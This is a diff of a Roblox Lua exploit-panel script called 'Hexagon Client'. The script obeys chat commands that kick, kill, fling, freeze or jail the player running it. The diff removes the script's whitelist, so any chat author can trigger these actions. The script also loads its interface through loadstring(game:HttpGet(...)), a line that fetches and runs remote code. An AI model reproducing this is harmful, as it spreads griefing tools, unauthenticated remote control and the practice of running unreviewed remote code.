@@ -4,65 +4,34 @@ local TextChatService = game:GetService("TextChatService")
 local RunService = game:GetService("RunService")
 local LocalPlayer = Players.LocalPlayer
 
-local function notify(name, msg)
-	WindUI:Notify({
-    	Title = name,
-    	Content = msg,
-    	Duration = 3,
-	})
-end
-
-local hxList = {
-    ["Roun95"] = true,
-    ["Deluxe_Studios"] = true,
-    ["ketylnbel"] = true, -- Admin
-    ["FuseRoX_52"] = true, -- Buyer
-}
-        
--- Valores
-local playerOriginalSpeed = {}
-local jaulas = {}
+local playerOldSpeed = {}
+local jails = {}
 local jailConnections = {}
-        
--- Envia comando no chat (usa TextChannels)
-local function EnviarComando(comando, alvo)
-    local canal = TextChatService.TextChannels:FindFirstChild("RBXGeneral") or TextChatService.TextChannels:GetChildren()[1]
-    if canal then
-        canal:SendAsync(";" .. comando .. " " .. (alvo or ""))
+
+local function sendCommand(command, aim)
+    local ch = TextChatService.TextChannels:FindFirstChild("RBXGeneral") or TextChatService.TextChannels:GetChildren()[1]
+    if ch then
+        ch:SendAsync(";" .. command .. " " .. (aim or ""))
     end
 end
 
--- Função que processa cada mensagem recebida (originais e locais)
-local function ProcessarMensagem(msgText, authorName)
+local function processMessage(msgText, authorName)
     if not msgText or not authorName then return end
 
-    local comandoLower = msgText:lower()
+    local commandLower = msgText:lower()
     local targetLower = LocalPlayer.Name:lower()
     local character = LocalPlayer.Character
     local humanoid = character and character:FindFirstChildOfClass("Humanoid")
 
-    -- COMANDOS QUE AFETAM O LOCAL PLAYER (verifica se o comando inclui o nome do local player)
-    if comandoLower:match(";kick%s+" .. targetLower) then
-        if not hxList[LocalPlayer.Name] then
-			notify("Hexagon Admin", "Access denied")
-            return
-        end
+    if commandLower:match(";kick%s+" .. targetLower) then
         LocalPlayer:Kick("You have been kicked by Hexagon Client")
     end
 
-    if comandoLower:match(";kill%s+" .. targetLower) then
-        if not hxList[LocalPlayer.Name] then
-			notify("Hexagon Admin", "Access denied")
-            return
-        end
+    if commandLower:match(";kill%s+" .. targetLower) then
         if character then character:BreakJoints() end
     end
 
-    if comandoLower:match(";killplus%s+" .. targetLower) then
-	    if not hxList[LocalPlayer.Name] then
-			notify("Hexagon Admin", "Access denied")
-            return
-        end
+    if commandLower:match(";killplus%s+" .. targetLower) then
         if character then
             character:BreakJoints()
             local root = character:FindFirstChild("HumanoidRootPart")
@@ -86,11 +55,7 @@ local function ProcessarMensagem(msgText, authorName)
         end
     end
 
-    if comandoLower:match(";fling%s+" .. targetLower) then
-	    if not hxList[LocalPlayer.Name] then
-			notify("Hexagon Admin", "Access denied")
-            return
-        end
+    if commandLower:match(";fling%s+" .. targetLower) then
         if character then
             local root = character:FindFirstChild("HumanoidRootPart")
             if root then
@@ -99,37 +64,25 @@ local function ProcessarMensagem(msgText, authorName)
         end
     end
 
-    if comandoLower:match(";freeze%s+" .. targetLower) then
-        if not hxList[LocalPlayer.Name] then
-			notify("Hexagon Admin", "Access denied")
-            return
-        end
+    if commandLower:match(";freeze%s+" .. targetLower) then
         if humanoid then
-            playerOriginalSpeed[targetLower] = humanoid.WalkSpeed
+            playerOldSpeed[targetLower] = humanoid.WalkSpeed
             humanoid.WalkSpeed = 0
         end
     end
 
-    if comandoLower:match(";unfreeze%s+" .. targetLower) then
-	    if not hxList[LocalPlayer.Name] then
-			notify("Hexagon Admin", "Access denied")
-            return
-        end
+    if commandLower:match(";unfreeze%s+" .. targetLower) then
         if humanoid then
-            humanoid.WalkSpeed = playerOriginalSpeed[targetLower] or 16
+            humanoid.WalkSpeed = playerOldSpeed[targetLower] or 16
         end
     end
 
-    if comandoLower:match(";jail%s+" .. targetLower) then
-	    if not hxList[LocalPlayer.Name] then
-			notify("Hexagon Admin", "Access denied")
-            return
-        end
+    if commandLower:match(";jail%s+" .. targetLower) then
         if character then
             local root = character:FindFirstChild("HumanoidRootPart")
             if root then
                 local pos = root.Position
-                jaulas[targetLower] = {}
+                jails[targetLower] = {}
 
                 local function criarPart(cf,s)
                     local p = Instance.new("Part")
@@ -139,7 +92,7 @@ local function ProcessarMensagem(msgText, authorName)
                     p.Transparency = 0.5
                     p.Color = Color3.fromRGB(0,0,0)
                     p.Parent = Workspace
-                    table.insert(jaulas[targetLower], p)
+                    table.insert(jails[targetLower], p)
                 end
 
                 criarPart(CFrame.new(pos + Vector3.new(5,0,0)), Vector3.new(1,10,10))
@@ -160,16 +113,12 @@ local function ProcessarMensagem(msgText, authorName)
         end
     end
 
-    if comandoLower:match(";unjail%s+" .. targetLower) then
-	    if not hxList[LocalPlayer.Name] then
-			notify("Hexagon Admin", "Access denied")
-            return
-        end
-        if jaulas[targetLower] then
-            for _, v in pairs(jaulas[targetLower]) do
+    if commandLower:match(";unjail%s+" .. targetLower) then
+        if jails[targetLower] then
+            for _, v in pairs(jails[targetLower]) do
                 if v and v.Destroy then pcall(v.Destroy, v) end
             end
-            jaulas[targetLower] = nil
+            jails[targetLower] = nil
         end
         if jailConnections[targetLower] then
             jailConnections[targetLower]:Disconnect()
@@ -177,68 +126,57 @@ local function ProcessarMensagem(msgText, authorName)
         end
     end
 
-    -- COMANDO UNIVERSAL ;verify -> faz o local player enviar Hexagon_####
-    if comandoLower:match("^;verify") then
-	    if not hxList[LocalPlayer.Name] then
-			notify("Hexagon Admin", "Access denied")
-            return
-        end
-        local canal = TextChatService.TextChannels:FindFirstChild("RBXGeneral") or TextChatService.TextChannels:GetChildren()[1]
-        if canal then
-            canal:SendAsync("Hexagon_####")
+    if commandLower:match("^;verify") then
+        local ch = TextChatService.TextChannels:FindFirstChild("RBXGeneral") or TextChatService.TextChannels:GetChildren()[1]
+        if ch then
+            ch:SendAsync("Hexagon_####")
         end
     end
 end
 
--- Conectar canais de chat existentes e futuros
-local function ConectarCanal(canal)
-    if not canal or not canal.IsA then return end
-    if not canal:IsA("TextChannel") then return end
-    canal.MessageReceived:Connect(function(msg)
-        -- msg.Text e msg.TextSource
+local function conectChannel(ch)
+    if not ch or not ch.IsA then return end
+    if not ch:IsA("TextChannel") then return end
+    ch.MessageReceived:Connect(function(msg)
         local text = msg.Text
         local source = msg.TextSource and msg.TextSource.Name
         if text and source then
-            ProcessarMensagem(text, source)
+            processMessage(text, source)
         end
     end)
 end
 
--- Conecta canais já existentes
-for _, ch in pairs(TextChatService.TextChannels:GetChildren()) do
-    ConectarCanal(ch)
+for _, tch in pairs(TextChatService.TextChannels:GetChildren()) do
+    conectChannel(tch)
 end
-
--- Conecta canais novos
-TextChatService.TextChannels.ChildAdded:Connect(function(ch)
-    ConectarCanal(ch)
+TextChatService.TextChannels.ChildAdded:Connect(function(tch)
+    conectChannel(tch)
 end)
 
--- Painel Hexagon (WindUI)
 local WindUILib = loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/releases/latest/download/main.lua"))()
 local Window = WindUILib:CreateWindow({
-        Title = "Hexagon Admin",
-        Icon =  "rbxassetid://ID",
-        Author = "by Nova",
-        Size = UDim2.fromOffset(580,460),
-        Transparent = true,
-        Theme = "Dark",
+    Title = "Hexagon Client",
+	Icon = "rbxassetid://130681274976406",
+    Author = "Admin · " .. LocalPlayer.DisplayName,
+    Size = UDim2.fromOffset(580,460),
+    Transparent = true,
+    Theme = "Dark",
 })
 
 local AdmTab = Window:Tab({ Title = "Admin", Icon = "crown", Locked = false })
 local Section = AdmTab:Section({ Title = "Admin Commands", Icon = "user-cog", Opened = true })
 
 local function getPlayersList()
-	local t = {}
-	for _, p in ipairs(Players:GetPlayers()) do
-    	table.insert(t, p.Name)
-	end
-	return t
+local t = {}
+for _, p in ipairs(Players:GetPlayers()) do
+    table.insert(t, p.Name)
+end
+return t
 end
 
 local TargetName
 local Dropdown = Section:Dropdown({
-	Title = "Select Player",
+    Title = "Select Player",
     Values = getPlayersList(),
     Value = "",
     Callback = function(opt) TargetName = opt end
@@ -251,22 +189,21 @@ Players.PlayerRemoving:Connect(function()
 	Dropdown:SetValues(getPlayersList())
 end)
 
-local comandos = { "kick","kill","killplus","fling","freeze","unfreeze","jail","unjail","verify" }
-for _, cmd in ipairs(comandos) do
+local commands = {"verify","kick","kill","killplus","fling","freeze","unfreeze","jail","unjail"}
+for _, cmd in ipairs(commands) do
 Section:Button({
-        Title = cmd:lower(),
-        Desc = "Script for ;"..cmd.." - Target",
-        Callback = function()
+    Title = cmd:lower(),
+    Desc = "Use ;"..cmd.." - Target",
+    Callback = function()
         if cmd == "verify" then
-                -- verify é universal, não precisa de alvo
-                EnviarComando("verify", "")
-        else
-                if TargetName and TargetName ~= "" then
-                EnviarComando(cmd, TargetName)
-                else
-                notify("No player selected")
-            end
+			sendCommand("verify", "")
+    	else
+		if TargetName and TargetName ~= "" then
+			sendCommand(cmd, TargetName)
+		else
+		warn("No player selected")
         end
+    end
 end
 })
 end
